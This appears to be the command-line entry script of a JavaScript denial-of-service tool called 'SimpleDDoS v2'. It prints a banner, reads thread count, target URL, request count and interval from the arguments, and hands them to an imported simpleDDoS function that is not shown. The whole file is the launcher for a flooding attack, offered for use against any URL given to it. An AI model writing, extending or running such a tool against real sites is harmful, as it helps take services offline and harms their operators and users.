import { simpleDDoS } from './index.js'
import cfonts from 'cfonts'
import { yellow, cyan, blue, underline } from 'colorette'

const title = cfonts.render('SimpleDDoS', {
  gradient: ['yellow', 'red'],
  transitionGradient: true,
  font: 'tiny'
}).string

console.log(`${title.slice(0, title.length - 2)}v2\n\n   by ${cyan('v1rtl (https://v1rtl.site)')}`)

const args = process.argv.slice(2, process.argv.length)

if (!args || args.length < 3) {
  console.log(yellow(`\n Usage:\n`), cyan(`\n   simple-ddos <threads> <url> <request count> <interval>`))
} else {
  console.log(
    `\n\nRunning in ${blue(args[0])} threads on ${underline(blue(args[1]))} with ${blue(args[2])} requests every ${blue(
      `${args[3] / 1000}s`
    )}\n\n`
  )

  simpleDDoS(...args)
}
